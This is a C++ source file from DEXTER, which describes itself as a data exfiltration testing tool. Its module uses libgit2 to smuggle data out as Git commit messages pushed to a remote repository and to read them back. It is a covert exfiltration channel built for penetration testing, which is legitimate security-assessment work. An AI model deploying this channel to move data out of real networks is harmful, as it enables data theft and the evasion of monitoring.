//DEXTER - Data EXfiltration TestER
//This file is part of DEXTER Project

//Written by : @maldevel
//Website : https ://www.twelvesec.com/
//GIT : https://github.com/twelvesec/dexter

//TwelveSec(@Twelvesec)

//This program is free software : you can redistribute it and/or modify
//it under the terms of the GNU General Public License as published by
//the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.

//This program is distributed in the hope that it will be useful,
//but WITHOUT ANY WARRANTY; without even the implied warranty of
//MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the
//GNU General Public License for more details.

//You should have received a copy of the GNU General Public License
//along with this program.If not, see < http://www.gnu.org/licenses/>.

//For more see the file 'LICENSE' for copying permission.

#include "libgit.h"

#pragma comment (lib, "winhttp.lib")
#pragma comment (lib, "Rpcrt4.lib")

static bool _INITIALIZED_ = false;

char *user;
char *pass;

struct fetch_payload {
	char branch[100];
	git_oid branch_oid;
};

static int fetchhead_ref_cb(const char* name, const char* url, const git_oid* oid, unsigned int is_merge, void* payload_v) {
	struct fetch_payload* payload = (struct fetch_payload*) payload_v;
	if (is_merge) {
		strncpy_s(payload->branch, 100, name, _TRUNCATE);
		memcpy_s(&payload->branch_oid, sizeof(git_oid), oid, sizeof(git_oid));
	}
	return 0;
}

static int get_credentials(git_cred** cred, const char* url, const char* username_from_url, unsigned int allowed_types, void* payload) {
	git_cred_userpass_plaintext_new(cred, user, pass);
	return 0;
}

//static void print_git_error(int error) {
//	const git_error *err = giterr_last();
//	if (err) printf("ERROR %d: %s\n", err->klass, err->message);
//	else printf("ERROR %d: no detailed info\n", error);
//}

void libgit::init(void) {
	git_libgit2_init();
	_INITIALIZED_ = true;
}

void libgit::finalize(void) {
	git_libgit2_shutdown();
	_INITIALIZED_ = false;
}

bool libgit::add_and_commit(std::string username, std::string password, std::string email, std::string url, std::string folder, std::string data) {

	if (!_INITIALIZED_) {
		return false;
	}

	git_index *index = NULL;
	git_repository *repo = NULL;
	git_remote *remote = NULL;

	git_push_options push_options = GIT_PUSH_OPTIONS_INIT;

	git_oid tree_oid, commit_oid;
	git_signature *signature = NULL;
	git_tree *tree = NULL;
	git_buf buffer;
	git_object *obj = NULL;
	git_object *curr_commit_obj = NULL;
	git_commit *curr_commit = NULL;

	char *ref_str = new char[37];
	char temp[MAX_PATH];
	GetTempPathA(MAX_PATH, temp);
	std::string temp_path = std::string(temp) + folder;
	bool success = true;
	//int error = 0;
	std::string filename_to_add = "test.txt";
	std::string temp_file = std::string(temp) + folder + "\\" + filename_to_add;

	SecureZeroMemory(&buffer, sizeof(git_buf));

	if (success && strncpy_s(ref_str, 37, "refs/heads/master:refs/heads/master", _TRUNCATE) != 0) {
		success = false;
	}

	const git_strarray refs = { &ref_str, 1 };

	if (success && (user = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, username.size() + 1)) == NULL) {
		success = false;
	}

	if (success && (pass = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, password.size() + 1)) == NULL) {
		success = false;
	}

	if (success && strncpy_s(user, username.size() + 1, username.c_str(), _TRUNCATE) != 0) {
		success = false;
	}

	if (success && strncpy_s(pass, password.size() + 1, password.c_str(), _TRUNCATE) != 0) {
		success = false;
	}

	if (success && !clone_or_pull(&repo, &remote, user, pass, url, folder)) {
		success = false;
	}

	if (success && git_revparse_single(&curr_commit_obj, repo, "HEAD") != 0) {
		success = false;
	}

	if (success && git_commit_lookup(&curr_commit, repo, git_object_id(curr_commit_obj)) != 0) {
		success = false;
	}

	if (success && git_commit_tree(&tree, curr_commit) != 0) {
		success = false;
	}

	if (success && git_repository_index(&index, repo) != 0) {
		success = false;
	}

	if (success && git_index_read_tree(index, tree) != 0) {
		success = false;
	}

	if (success && !CloseHandle(CreateFileA(temp_file.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL))) {
		success = false;
	}

	if (success && /*(error = */git_index_add_bypath(index, filename_to_add.c_str())/*)*/ != 0) {
		//print_git_error(error);
		success = false;
	}

	if (success && git_index_write_tree(&tree_oid, index) != 0) {
		success = false;
	}

	if (success && git_signature_now(&signature, username.c_str(), email.c_str()) != 0) {
		success = false;
	}

	if (success && git_message_prettify(&buffer, data.c_str(), 0, '#') != 0) {
		success = false;
	}

	const git_commit *parent[] = { curr_commit };

	if (success && /*(error = */git_tree_lookup(&tree, repo, &tree_oid)/*)*/ != 0) {
		//print_git_error(error);
		success = false;
	}

	if (success && /*(error = */git_commit_create(&commit_oid, repo, "HEAD", signature, signature, "UTF-8", buffer.ptr, tree, 1, parent)/*)*/ != 0) {
		//print_git_error(error);
		success = false;
	}

	if (remote == NULL) {
		if (success && git_remote_lookup(&remote, repo, "origin") != 0) {
			success = false;
		}
	}

	if (success && git_remote_init_callbacks(&push_options.callbacks, GIT_REMOTE_CALLBACKS_VERSION) != 0) {
		success = false;
	}

	push_options.callbacks.credentials = get_credentials;

	if (success && git_remote_push(remote, &refs, &push_options) != 0) {
		success = false;
	}

	if (tree) {
		git_tree_free(tree);
		tree = NULL;
	}

	git_buf_dispose(&buffer);

	if (signature) {
		git_signature_free(signature);
		signature = NULL;
	}

	if (index) {
		git_index_free(index);
		index = NULL;
	}

	if (curr_commit) {
		git_commit_free(curr_commit);
		curr_commit = NULL;
	}

	if (curr_commit_obj) {
		git_object_free(curr_commit_obj);
		curr_commit_obj = NULL;
	}

	if (remote) {
		git_remote_free(remote);
		remote = NULL;
	}

	if (repo) {
		git_repository_free(repo);
		repo = NULL;
	}

	if (pass) {
		SecureZeroMemory(pass, sizeof(pass));
		HeapFree(GetProcessHeap(), 0, pass);
		pass = NULL;
	}

	if (user) {
		SecureZeroMemory(user, sizeof(user));
		HeapFree(GetProcessHeap(), 0, user);
		user = NULL;
	}

	return success;
}

std::vector<std::string> libgit::commit_messages(std::string username, std::string password, std::string url, std::string folder) {

	std::vector<std::string> messages;

	if (!_INITIALIZED_) {
		return messages;
	}
	
	bool success = true;
	git_repository *repo = NULL;
	git_remote *remote = NULL;
	git_revwalk *walker = NULL;
	git_oid oid;
	git_commit *commit;

	if (success && (user = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, username.size() + 1)) == NULL) {
		success = false;
	}

	if (success && (pass = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, password.size() + 1)) == NULL) {
		success = false;
	}

	if (success && strncpy_s(user, username.size() + 1, username.c_str(), _TRUNCATE) != 0) {
		success = false;
	}

	if (success && strncpy_s(pass, password.size() + 1, password.c_str(), _TRUNCATE) != 0) {
		success = false;
	}

	if (success && !clone_or_pull(&repo, &remote, user, pass, url, folder)) {
		success = false;
	}

	if (success && git_revwalk_new(&walker, repo) != 0) {
		success = false;
	}

	if (success) {
		git_revwalk_sorting(walker, GIT_SORT_TOPOLOGICAL);
	}

	if (success && git_revwalk_push_head(walker) != 0) {
		success = false;
	}

	if (success) {
		while (git_revwalk_next(&oid, walker) == 0) {
			if (git_commit_lookup(&commit, repo, &oid)) {
				break;
			}

			std::string message = std::string(git_commit_message(commit));
			message = message.substr(0, message.size() - 1);
			messages.push_back(message);
			git_commit_free(commit);
		}
	}

	if (walker) {
		git_revwalk_free(walker);
		walker = NULL;
	}

	if (remote) {
		git_remote_free(remote);
		remote = NULL;
	}

	if (repo) {
		git_repository_free(repo);
		repo = NULL;
	}

	if (pass) {
		SecureZeroMemory(pass, sizeof(pass));
		HeapFree(GetProcessHeap(), 0, pass);
		pass = NULL;
	}

	if (user) {
		SecureZeroMemory(user, sizeof(user));
		HeapFree(GetProcessHeap(), 0, user);
		user = NULL;
	}

	return messages;
}

bool libgit::clone_or_pull(git_repository **repo, git_remote **remote, char *username, char *password, std::string url, std::string folder) {

	if (!_INITIALIZED_) {
		return false;
	}

	bool success = true;

	git_fetch_options fetch_options = GIT_FETCH_OPTIONS_INIT;
	struct fetch_payload payload;
	git_annotated_commit* heads[1];
	git_merge_analysis_t merge_analysis_t;
	git_merge_preference_t merge_preference_t;
	git_reference *target_ref = NULL;
	git_reference *new_target_ref = NULL;
	git_object *target = NULL;
	git_checkout_options checkout_options = GIT_CHECKOUT_OPTIONS_INIT;
	git_clone_options clone_options = GIT_CLONE_OPTIONS_INIT;

	char temp[MAX_PATH];
	GetTempPathA(MAX_PATH, temp);
	std::string temp_path = std::string(temp) + folder;

	if (git_repository_open(repo, temp_path.c_str()) == 0) {

		if (success && git_remote_lookup(remote, *repo, "origin") != 0) {
			success = false;
		}

		fetch_options.callbacks.credentials = get_credentials;

		if (success && git_remote_fetch(*remote, NULL, &fetch_options, "fetch") != 0) {
			success = false;
		}

		if (success && git_repository_fetchhead_foreach(*repo, fetchhead_ref_cb, &payload) != 0) {
			success = false;
		}

		if (success && git_annotated_commit_lookup(&heads[0], *repo, &payload.branch_oid) != 0) {
			success = false;
		}

		if (success && git_merge_analysis(&merge_analysis_t, &merge_preference_t, *repo, (const git_annotated_commit**)&heads[0], 1) != 0) {
			success = false;
		}

		if (success && git_repository_head(&target_ref, *repo) != 0) {
			success = false;
		}

		if (success && git_object_lookup(&target, *repo, &payload.branch_oid, GIT_OBJ_COMMIT) != 0) {
			success = false;
		}

		checkout_options.checkout_strategy = GIT_CHECKOUT_SAFE;
		if (success && git_checkout_tree(*repo, target, &checkout_options) != 0) {
			success = false;
		}

		if (success && git_reference_set_target(&new_target_ref, target_ref, &payload.branch_oid, NULL) != 0) {
			success = false;
		}
	}
	else {

		checkout_options.checkout_strategy = GIT_CHECKOUT_SAFE;
		clone_options.checkout_opts = checkout_options;
		clone_options.fetch_opts.callbacks.credentials = get_credentials;

		if (success && git_clone(repo, url.c_str(), temp_path.c_str(), &clone_options) != 0) {
			success = false;
		}
	}

	if (target) {
		git_object_free(target);
		target = NULL;
	}

	if (target_ref) {
		git_reference_free(target_ref);
		target_ref = NULL;
	}

	if (new_target_ref) {
		git_reference_free(new_target_ref);
		new_target_ref = NULL;
	}

	return success;
}
